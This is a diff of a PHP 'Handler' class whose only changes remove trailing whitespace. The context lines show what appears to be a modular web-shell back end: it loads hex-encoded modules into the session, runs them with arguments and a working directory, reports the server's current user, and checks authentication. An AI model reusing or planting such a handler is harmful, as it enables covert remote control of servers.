@@ -22,7 +22,7 @@ class Handler
 
     private $REQ_ACTION_KEY                  = "action";
     private $REQ_MSG_KEY                     = "data";
-    
+
     private $REQ_MOD_ID_KEY                  = "id";
     private $REQ_MOD_NAME_KEY                = "name";
     private $REQ_MOD_CONTENT_KEY             = "content";
@@ -31,7 +31,7 @@ class Handler
 
     private $MOD_ARGS_VAR                    = "#{ARGS}";
     private $MOD_CWD_VAR                     = "#{CWD}";
-    
+
     private $RES_STATUS_KEY                  = "status";
     private $RES_MESSAGE_KEY                 = "message";
 
@@ -141,7 +141,7 @@ class Handler
         $fields = explode($this->FIELD_SEPARATOR, $packed_request);
         if (sizeof($fields) < 1)
             throw new Exception("unpack_data(): err explode() fields < 1", 1);
-        
+
         $data = array();
         foreach ($fields as $field)
         {
@@ -172,7 +172,7 @@ class Handler
 
     private function modules_to_str($extend)
     {
-        $modules = ""; 
+        $modules = "";
         foreach ($this->modules as $module)
         {
             $mod  = "";
@@ -198,11 +198,11 @@ class Handler
             $str_mod = @hex2bin($str_mod_hex);
             if ($str_mod === false)
                 throw new Exception("err hex2bin() mod str_to_modules", 1);
-            
+
             $str_mod_fields = explode($this->FIELD_SEPARATOR, $str_mod);
             if (sizeof($str_mod_fields) !== 4)
                 throw new Exception("err invalid module fields in str_to_modules", 1);
-            
+
             $str_mod_name = @hex2bin($str_mod_fields[1]);
             if ($str_mod_name === false)
                 throw new Exception("err hex2bin() mod name in str_to_modules", 1);
@@ -273,7 +273,7 @@ class Handler
             ]);
         }
         $this->refresh_modules();
-        $response  = ""; 
+        $response  = "";
         $response .= "id" . $this->VALUE_SEPARATOR . $module_id . $this->FIELD_SEPARATOR;
         $response .= "loaded" . $this->VALUE_SEPARATOR . $timestamp_now . $this->FIELD_SEPARATOR;
         $response .= "memory" . $this->VALUE_SEPARATOR . strlen($_SESSION[$this->SESSION_NAME]);
@@ -323,7 +323,7 @@ class Handler
             $mod_data = $mod_response_unpack[$this->MOD_RES_MESSAGE];
         else
             $mod_data = @hex2bin($mod_response_unpack[$this->MOD_RES_MESSAGE]);
-        
+
         if ($mod_data === false)
             throw new Exception($this->ERR_INVALID_MODULE_RESP_CONTENT, 1);
 
@@ -334,7 +334,7 @@ class Handler
     {
         array_splice($this->modules, $module_index, 1);
         $this->refresh_modules();
-        $response  = ""; 
+        $response  = "";
         $response .= "id" . $this->VALUE_SEPARATOR . $module_id . $this->FIELD_SEPARATOR;
         $response .= "memory" . $this->VALUE_SEPARATOR . strlen($_SESSION[$this->SESSION_NAME]);
         return $response;
@@ -351,7 +351,7 @@ class Handler
         $phpuname_fields = explode(" ", php_uname());
         if ($phpuname_fields[0] === "Windows")
             return @php_uname('n') . "\\" . getenv("username");
-        
+
         $user_id = @posix_getuid();
         $user_info = @posix_getpwuid($user_id);
         return $user_info['name'];
@@ -380,11 +380,11 @@ class Handler
     {
         if (!array_key_exists($this->REQ_MSG_KEY, $unpacked_request))
             return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_ACTION_DATA);
-        
+
         $action_data = @hex2bin($unpacked_request[$this->REQ_MSG_KEY]);
         if ($action_data === false)
             return $this->generate_response($this->ERR_CODE, $this->ERR_INVALID_ACTION_DATA);
-        
+
         $action_data_unpack = $this->unpack_data($action_data);
         if (!array_key_exists($this->REQ_MOD_NAME_KEY, $action_data_unpack))
             return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_MOD_NAME);
@@ -406,11 +406,11 @@ class Handler
     {
         if (!array_key_exists($this->REQ_MSG_KEY, $unpacked_request))
             return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_ACTION_DATA);
-        
+
         $action_data = @hex2bin($unpacked_request[$this->REQ_MSG_KEY]);
         if ($action_data === false)
             return $this->generate_response($this->ERR_CODE, $this->ERR_INVALID_ACTION_DATA);
-        
+
         $action_data_unpack = $this->unpack_data($action_data);
         if (!array_key_exists($this->REQ_MOD_ID_KEY, $action_data_unpack))
             return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_MOD_ID);
@@ -432,7 +432,7 @@ class Handler
         $module_index = $this->find_module("id", $mod_id);
         if ($module_index === -1)
             return $this->generate_response($this->ERR_CODE, "module id: '$mod_id' not found");
-        
+
         return $this->invoke_module(
             @hex2bin($this->modules[$module_index]["data"]),
             $mod_cwd,
@@ -444,15 +444,15 @@ class Handler
     {
         if (!array_key_exists($this->REQ_MSG_KEY, $unpacked_request))
             return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_ACTION_DATA);
-        
+
         $action_data = @hex2bin($unpacked_request[$this->REQ_MSG_KEY]);
         if ($action_data === false)
             return $this->generate_response($this->ERR_CODE, $this->ERR_INVALID_ACTION_DATA);
-        
+
         $action_data_unpack = $this->unpack_data($action_data);
         if (!array_key_exists($this->REQ_MOD_ID_KEY, $action_data_unpack))
             return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_MOD_ID);
-        
+
         $mod_id = $action_data_unpack[$this->REQ_MOD_ID_KEY];
         if (is_numeric($mod_id) === false)
             return $this->generate_response($this->ERR_CODE, $this->ERR_INVALID_MOD_ID);
@@ -460,7 +460,7 @@ class Handler
         $module_index = $this->find_module("id", $mod_id);
         if ($module_index === -1)
             return $this->generate_response($this->ERR_CODE, "module id: '$mod_id' not found");
-        
+
         $response = $this->remove_module($mod_id, $module_index);
         return $this->generate_response($this->SUCC_CODE, $response);
     }
@@ -546,7 +546,7 @@ try
         header($_SERVER['SERVER_PROTOCOL'] . ' 400 Bad Request', true, 400);
         exit();
     }
-    
+
     if (!$handler->authenticate())
     {
         header($_SERVER['SERVER_PROTOCOL'] . ' 500 Internal Server Error', true, 500);
